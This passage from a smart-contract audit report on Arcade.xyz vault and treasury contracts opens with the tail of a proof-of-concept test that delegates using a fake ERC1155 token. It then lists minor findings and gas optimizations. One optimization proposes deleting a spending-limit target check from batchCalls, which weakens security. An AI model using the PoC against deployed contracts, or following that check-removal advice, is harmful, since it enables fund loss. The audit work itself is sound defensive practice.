class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x02</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addNftAndDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint128 tokenId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">f</span><span class=\"mtk1\">), </span><span class=\"mtk3\">//address tokenAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xdead01</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xdead</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x01</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xdead01</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x01</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FakeERC1155</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">fallback</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h2 id=\"l-10-approve-zero-first\" style=\"position:relative;\"><a href=\"#l-10-approve-zero-first\" aria-label=\"l 10 approve zero first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-10] Approve zero first</h2>\n<p>Some ERC20 tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. For example, Tether, (USDT)‘s <code>approve()</code> function, will revert if the current approval is not zero to protect against front-running changes of approvals.</p>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/libraries/ArcadeMerkleRewards.sol#L86\">ArcadeMerkleRewards.sol#L86</a></li>\n</ul>\n<h2 id=\"non-critical-findings\" style=\"position:relative;\"><a href=\"#non-critical-findings\" aria-label=\"non critical findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Findings</h2>\n<h2 id=\"n-01-nftboostvault-sets-an-unused-initialized-value-in-storage\" style=\"position:relative;\"><a href=\"#n-01-nftboostvault-sets-an-unused-initialized-value-in-storage\" aria-label=\"n 01 nftboostvault sets an unused initialized value in storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] <code>NFTBoostVault</code> sets an unused <code>initialized</code> value in storage</h2>\n<p>The <code>\"initialized\"</code> storage variable is set on the constructor, but not used by the <code>NFTBoostVault</code>, or another contract, and can’t be accessed by any public or external method.</p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Verify if it is actually needed, or remove it in case it is not.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uint256Ptr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;initialized&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit check</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L91\">NFTBoostVault.sol#L91</a></p>\n<h2 id=\"n-02-arcdvestingvault-inherits-twice-from-hashedstoragereentrancyblock\" style=\"position:relative;\"><a href=\"#n-02-arcdvestingvault-inherits-twice-from-hashedstoragereentrancyblock\" aria-label=\"n 02 arcdvestingvault inherits twice from hashedstoragereentrancyblock permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] <code>ARCDVestingVault</code> inherits twice from <code>HashedStorageReentrancyBlock</code></h2>\n<p><code>ARCDVestingVault</code> inherits both from <code>HashedStorageReentrancyBlock</code> and <code>BaseVotingVault</code>. But <code>BaseVotingVault</code> is already inheriting from <code>HashedStorageReentrancyBlock</code>.</p>\n<p>Remove the unnecessary inheritance from <code>HashedStorageReentrancyBlock</code> on <code>ARCDVestingVault</code>.</p>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L48\">ARCDVestingVault.sol#L48</a></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/274#issuecomment-1663086309\">PowVT (Arcade.xyz) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>There are some good valid fixes in this report that we will address.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/274#issuecomment-1679503861\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>L03 - is largely already covered in the bot report. This is slightly different only its location in the codebase so doesn’t hurt to include it in the report.\nL10 - is in the bot report already.<br></p>\n<p>Otherwise severities look reasonable to me.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 10 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/254\">report highlighted below</a> by <strong>K42</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/498\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/178\">excalibor</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/150\">dharma09</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/89\">kaveyjoe</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/489\">SM3_SS</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/479\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/250\">Raihan</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/151\">Sathish9098</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/5\">jeffy</a>.</em></p>\n<h2 id=\"possible-optimizations-in-arcadetreasurysol\" style=\"position:relative;\"><a href=\"#possible-optimizations-in-arcadetreasurysol\" aria-label=\"possible optimizations in arcadetreasurysol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimizations in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol\">ArcadeTreasury.sol</a></h2>\n<h3 id=\"general-optimization\" style=\"position:relative;\"><a href=\"#general-optimization\" aria-label=\"general optimization permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>General Optimization</h3>\n<p>Reducing the number of state variable updates can save gas. In Ethereum, every storage operation costs a significant amount of gas. Therefore, optimizing the contract to minimize storage operations can lead to substantial gas savings.</p>\n<h3 id=\"possible-optimization-1\" style=\"position:relative;\"><a href=\"#possible-optimization-1\" aria-label=\"possible optimization 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 1</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L358C1-L373C6\">_spend</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L384C1-L394C6\">_approve</a> functions, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L360\">blockExpenditure</a> mapping is updated twice. This can be optimized to a single update, which would save gas.</p>\n<p>Here is the optimized code snippet: </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_spend</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destination</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_BlockSpendLimit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">ETH_CONSTANT</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destination</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destination</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TreasuryTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destination</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_BlockSpendLimit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TreasuryApproval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization reduces the number of storage operations from 2 to 1 in each of the _spend and _approve functions. Given that a storage operation costs 20,000 gas, this optimization could save approximately 20,000 gas per call to these functions.</p>\n<h3 id=\"possible-optimization-2\" style=\"position:relative;\"><a href=\"#possible-optimization-2\" aria-label=\"possible optimization 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 2</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L333C1-L345C6\">batchCalls</a> function can be optimized by removing the check <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L340\">if (spendThresholds[targets[i]].small != 0) revert T_InvalidTarget(targets[i]);</a>. This check is not necessary because if the target contract does not exist or does not have a function that matches the provided <code>calldata</code>, the call will fail anyway. Removing this check can save gas.</p>\n<p>Here is the optimized code: </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">batchCalls</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADMIN_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_ArrayLengthMismatch</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">call</span><span class=\"mtk1\">(</span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_CallFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization removes a storage read operation from the <code>batchCalls</code> function. Given that a storage read operation costs 200 gas, this optimization could save approximately 200 gas per call to this function. However, the actual gas savings would be higher when considering the gas cost of the conditional check and the potential revert operation.</p>\n<h2 id=\"possible-optimizations-in-basevotingvaultsol\" style=\"position:relative;\"><a href=\"#possible-optimizations-in-basevotingvaultsol\" aria-label=\"possible optimizations in basevotingvaultsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" 